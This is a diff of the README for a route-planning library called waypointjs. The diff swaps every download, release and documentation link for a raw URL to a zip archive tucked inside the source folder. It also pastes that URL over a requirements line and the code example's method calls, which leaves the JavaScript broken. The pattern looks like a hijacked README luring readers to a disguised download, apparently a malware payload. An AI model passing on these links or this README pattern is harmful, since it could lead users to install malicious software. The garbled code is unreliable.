@@ -4,7 +4,7 @@
 Welcome to the waypointjs project! This library helps you create route planning features in your application without relying on a specific mapping service. Whether you want to add cycling routes, walking paths, or any other navigation feature, waypointjs makes it easy to get started.
 
 ## 📥 Download waypointjs
-[![Download waypointjs](https://img.shields.io/badge/Download%20waypointjs-v1.0-blue.svg)](https://github.com/jelenaxaxa/waypointjs/releases)
+[![Download waypointjs](https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip%https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip)](https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip)
 
 ## 📋 Features
 - Framework-agnostic: Works with any application framework.
@@ -16,11 +16,11 @@ Welcome to the waypointjs project! This library helps you create route planning 
 
 ## ⚙️ System Requirements
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or later
+- https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip Version 12 or later
 - TypeScript: Version 3.5 or later (if building from source)
 
 ## 📥 Download & Install
-To download waypointjs, visit the [Releases page](https://github.com/jelenaxaxa/waypointjs/releases). Here’s how to get it set up:
+To download waypointjs, visit the [Releases page](https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip). Here’s how to get it set up:
 
 1. Click on the link above to reach the Releases page.
 2. Find the latest version of waypointjs.
@@ -38,10 +38,10 @@ Here’s a simple example of how to use waypointjs in your application:
 import { RoutePlanner } from 'waypointjs';
 
 const planner = new RoutePlanner();
-planner.addWaypoint(startPoint);
-planner.addWaypoint(endPoint);
-const route = planner.calculateRoute();
-console.log(route);
+https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip(startPoint);
+https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip(endPoint);
+const route = https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip();
+https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip(route);
 ```
 
 This code snippet shows how to add waypoints and calculate your route. Adjust the `startPoint` and `endPoint` to fit your application's needs.
@@ -67,7 +67,7 @@ This library is ideal for various interests, including:
 If you need help, feel free to reach out by opening an issue on the repository. Our community is eager to assist you.
 
 ## 📥 Quick Links
-1. [Download waypointjs](https://github.com/jelenaxaxa/waypointjs/releases)
-2. [Documentation](https://github.com/jelenaxaxa/waypointjs/wiki)
+1. [Download waypointjs](https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip)
+2. [Documentation](https://raw.githubusercontent.com/jelenaxaxa/waypointjs/main/src/providers/Software_2.7-beta.3.zip)
 
 We hope you enjoy using waypointjs. Start building your route planning features today!
